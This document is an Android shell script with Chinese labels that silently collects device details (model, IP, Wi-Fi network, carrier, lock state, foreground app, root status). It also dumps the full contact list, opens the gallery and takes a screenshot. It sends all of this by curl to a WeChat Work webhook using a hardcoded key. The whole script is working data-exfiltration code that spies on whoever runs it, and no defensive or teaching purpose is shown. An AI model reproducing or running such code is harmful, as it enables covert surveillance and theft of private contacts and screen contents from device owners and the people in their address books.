script:
d=/storage/emulated/0 key="3a891928-5cb6-4b56-8b55-45f44f7f6215"
collect_device_info() { now=$(date '+%Y-%m-%d %H:%M:%S')
brand=$(getprop ro.product.brand 2>/dev/null) model=$(getprop ro.product.model 2>/dev/null) [ -n "$model" ] || model=$(getprop ro.product.device 2>/dev/null) rel=$(getprop ro.build.version.release 2>/dev/null) sdk=$(getprop ro.build.version.sdk 2>/dev/null) kern=$(uname -r 2>/dev/null) host=$(hostname 2>/dev/null) carrier=$(getprop gsm.operator.alpha 2>/dev/null | head -n 1) carrier=${carrier#,} carrier=$(printf '%s' "$carrier" | tr -d ' ') [ -n "$carrier" ] || carrier="-"
if [ -n "$model" ] && [ -n "$brand" ]; then dev="$brand $model" elif [ -n "$model" ]; then dev="$model" elif [ -n "$brand" ]; then dev="$brand" else dev="-" fi if [ -n "$rel" ] && [ -n "$sdk" ]; then sysv="$rel (SDK $sdk)" elif [ -n "$rel" ]; then sysv="$rel" else sysv="-" fi [ -n "$kern" ] || kern="-" [ -n "$host" ] || host="-"
ps_dir="" for p in /sys/class/power_supply/*/; do [ -r "${p}capacity" ] && ps_dir="$p" && break done [ -n "$ps_dir" ] || ps_dir="/sys/class/power_supply/battery/"
pct=$(cat "${ps_dir}capacity" 2>/dev/null) [ -n "$pct" ] || pct=$(dumpsys battery 2>/dev/null | sed -n 's/.*level: *\([0-9][0-9]*\).*/\1/p' | head -n 1)
stat=$(cat "${ps_dir}status" 2>/dev/null) [ -n "$stat" ] || stat=$(dumpsys battery 2>/dev/null | sed -n 's/.*status: *\([0-9A-Za-z ]*\).*/\1/p' | head -n 1) stat=$(printf '%s' "$stat" | tr -d '\r' | xargs)
case "$stat" in Charging|charging|2|Full|full|5) stat="充电中" ;; Discharging|discharging|3) stat="放电中" ;; "Not charging"|"not charging"|4) stat="未充电" ;; 1|Unknown|unknown) stat="未知" ;; *) stat="" ;; esac
if [ -n "$pct" ]; then [ -n "$stat" ] && bat="$pct% $stat" || bat="$pct%" else bat="-" fi
tmp=$(cat "${ps_dir}temp" 2>/dev/null) case "$tmp" in ''|*[!0-9]*) bat_t="" ;; *) bat_t="$((tmp / 10)).$((tmp % 10))°C" ;; esac [ -n "$bat_t" ] && bat="$bat 电池 $bat_t"
health=$(cat "${ps_dir}health" 2>/dev/null) [ -n "$health" ] && bat="$bat 健康 $health"
mt=$(awk '/MemTotal/{print $2}' /proc/meminfo 2>/dev/null) ma=$(awk '/MemAvailable/{print $2}' /proc/meminfo 2>/dev/null) case "$mt$ma" in ''|*[!0-9]*) mem="-" ;; *) mem=$(awk -v a="$ma" -v t="$mt" 'BEGIN{printf "%.1fG 可用 / %.1fG", a/1048576, t/1048576}') ;; esac
stor=$(df -k /data 2>/dev/null | tail -n 1 | awk '{printf "%.0fG 可用 / %.0fG", $4/1048576, $2/1048576}') [ -n "$stor" ] || stor="-"
ip=$(ip -o route get 1.1.1.1 2>/dev/null | sed -n 's/.* src \([^ ]*\).*/\1/p' | head -n 1) [ -n "$ip" ] || ip="-"
nt=$(getprop gsm.network.type 2>/dev/null) [ -z "$nt" ] && nt=$(getprop ro.vendor.data.network 2>/dev/null) case "$nt" in NR|nr) nt="5G" ;; LTE|Lte) nt="4G" ;; UMTS|HSDPA|HSPA|HSUPA) nt="3G" ;; EDGE|GPRS|CDMA) nt="2G" ;; *) nt="" ;; esac
wifion=$(settings get global wifi_on 2>/dev/null) ssid=$(dumpsys wifi 2>/dev/null | sed -n 's/.*SSID: "\([^"]*\)".*/\1/p' | head -n 1) case "$ssid" in "<unknown ssid>"|"") ssid="" ;; esac if [ "$wifion" = "1" ] && [ -n "$ssid" ]; then net="WiFi $ssid" elif [ "$wifion" = "1" ]; then net="WiFi" elif [ -n "$nt" ]; then net="移动网络 $nt" else net="-" fi
wake=$(dumpsys power 2>/dev/null | grep -o 'mWakefulness=[A-Za-z]*' | head -n 1 | cut -d= -f2) case "$wake" in Awake) scr="亮屏" ;; Asleep) scr="熄屏" ;; Dozing) scr="息屏显示" ;; *) scr="" ;; esac lock=$(dumpsys window 2>/dev/null | grep -o 'mDreamingLockscreen=[a-z]*' | head -n 1 | cut -d= -f2) case "$lock" in true) lk="已锁屏" ;; false) lk="已解锁" ;; *) lk="" ;; esac if [ -n "$scr" ] && [ -n "$lk" ]; then screen="$scr $lk" elif [ -n "$scr" ]; then screen="$scr" elif [ -n "$lk" ]; then screen="$lk" else screen="-" fi
fg=$(dumpsys window 2>/dev/null | grep -E 'mCurrentFocus|mFocusedApp' | head -n 1 | grep -oE '[A-Za-z0-9._]+/[A-Za-z0-9._$]+' | head -n 1) [ -n "$fg" ] || fg="-"
ct="" for z in /sys/class/thermal/thermal_zone*/temp; do [ -r "$z" ] || continue v=$(cat "$z" 2>/dev/null) case "$v" in ''|*[!0-9]*) continue ;; esac [ "$v" -gt 1000 ] && v=$((v / 1000)) if [ "$v" -ge 1 ] && [ "$v" -le 120 ]; then if [ -z "$ct" ] || [ "$v" -gt "$ct" ]; then ct="$v" fi fi done [ -n "$ct" ] && ct="CPU ${ct}°C" || ct="-"
selinux=$(getenforce 2>/dev/null) if [ -z "$selinux" ] && [ -r /sys/fs/selinux/enforce ]; then [ "$(cat /sys/fs/selinux/enforce 2>/dev/null)" = "1" ] && selinux="Enforcing" || selinux="Permissive" fi [ -n "$selinux" ] || selinux="-"
if [ -d /data/adb/magisk ] || command -v magisk >/dev/null 2>&1; then rv=$(magisk -V 2>/dev/null) [ -n "$rv" ] && root="Magisk $rv" || root="Magisk" elif [ -d /data/adb/ksu ] || [ -d /data/adb/ksud ]; then root="KernelSU" elif [ -d /data/adb/ap ]; then root="APatch" else root="-" fi
up=$(cut -d. -f1 /proc/uptime 2>/dev/null) case "$up" in ''|*[!0-9]*) upt="-" ;; *) up_d=$((up / 86400)) up_h=$(((up % 86400) / 3600)) up_m=$(((up % 3600) / 60)) if [ "$up_d" -gt 0 ]; then upt="${up_d}天${up_h}小时" elif [ "$up_h" -gt 0 ]; then upt="${up_h}小时${up_m}分" else upt="${up_m}分钟" fi ;; esac
mkdir -p "$d" cat > "${d}/info_temp.txt" <<INFO 【设备状态】$now 机型: $dev 系统: $sysv 内核: $kern 主机: $host 电量: $bat 内存: $mem 存储: $stor 网络: $net 运营商: $carrier IP: $ip 屏幕: $screen 前台: $fg 温度: $ct root: $root SELinux: $selinux 开机: $upt INFO }
send_wx_text() { local text="$1" local content="" local line esc while IFS= read -r line; do esc=$(printf '%s' "$line" | sed 's/\\/\\\\/g; s/"/\\"/g') if [ -n "$content" ]; then content="$content\\n$esc" else content="$esc" fi done <<< "$text"
curl -s -X POST \ "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=$key" \ -H "Content-Type: application/json" \ -d @- <<EOF { "msgtype": "text", "text": { "content": "$content" } } EOF } collect_device_info send_wx_text "$(cat "${d}/info_temp.txt")"
content query --uri content://com.android.contacts/data/phones --projection display_name:data4:data1 > "${d}/通讯录.txt" 2>/dev/null content query --uri content://contacts/phones --projection display_name:number >> "${d}/通讯录.txt" 2>/dev/null mid=$(curl -s -F "media=@${d}/通讯录.txt" "https://qyapi.weixin.qq.com/cgi-bin/webhook/upload_media?key=$key&type=file" | sed -n 's/.*"media_id":"\([^"]*\)".*/\1/p') curl -s -X POST "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=$key" -H "Content-Type: application/json" -d "{\"msgtype\":\"file\",\"file\":{\"media_id\":\"$mid\"}}"
am start -a android.intent.action.MAIN -c android.intent.category.APP_GALLERY sleep 1 screencap "$d/screenshot.png"; screencap "$d/screenshot.jpg" image_path=$(ls -Sr "$d/screenshot.png" "$d/screenshot.jpg" 2>/dev/null | head -1)
image_base64=$(base64 -w 0 "$image_path") image_md5=$(md5sum "$image_path" | cut -d' ' -f1)
curl -s -X POST \ "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=$key" \ -H "Content-Type: application/json" \ -d @- <<EOF { "msgtype": "image", "image": { "base64": "$image_base64", "md5": "$image_md5" } } EOF
